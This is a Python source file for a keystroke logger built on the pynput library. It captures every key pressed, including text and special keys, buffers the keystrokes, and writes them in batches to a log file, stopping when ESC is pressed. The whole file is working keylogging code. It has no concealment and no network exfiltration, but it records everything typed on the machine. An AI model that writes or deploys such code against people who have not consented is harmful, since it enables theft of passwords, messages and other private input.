from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
import config

class Keylogger:
    def __init__(self, log_file=config.KEYSTROKE_LOG_FILE):
        
        self.log_file = log_file
        self.keys_buffer = []
        self.key_count = 0
        self.buffer_size = config.LOG_BUFFER_SIZE
        
        
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        
        
        logging.basicConfig(
            filename=str(self.log_file),
            level=logging.INFO,
            format='%(asctime)s: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
       
        logging.info(f"\n{'='*60}\nNEW SESSION STARTED\n{'='*60}")
    
    def on_press(self, key):
        
        try:
            
            self.keys_buffer.append(key.char)
        except AttributeError:
            
            if key == Key.space:
                self.keys_buffer.append(' ')
            elif key == Key.enter:
                self.keys_buffer.append('\n')
            elif key == Key.tab:
                self.keys_buffer.append('\t')
            elif key == Key.backspace:
                self.keys_buffer.append('[BACKSPACE]')
            elif key == Key.shift or key == Key.shift_r:
                pass  
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                pass  
            else:
                self.keys_buffer.append(f'[{str(key).replace("Key.", "")}]')
        
        self.key_count += 1
        
        
        if self.key_count >= self.buffer_size:
            self.write_to_file()
            self.key_count = 0
            self.keys_buffer = []
    
    def on_release(self, key):
        
        
        if key == Key.esc:
            print("\n[*] ESC key pressed. Stopping keylogger...")
            return False
    
    def write_to_file(self):
        
        if self.keys_buffer:
            log_entry = ''.join(self.keys_buffer)
            logging.info(log_entry)
            print(f"[*] Logged {len(self.keys_buffer)} keystrokes")
    
    def start(self):
       
        print("[*] Keylogger started. Press ESC to stop.")
        
        
        with Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()
        
        
        self.write_to_file()
        logging.info(f"\n{'='*60}\nSESSION ENDED\n{'='*60}\n")
        print("[*] Keylogger stopped")
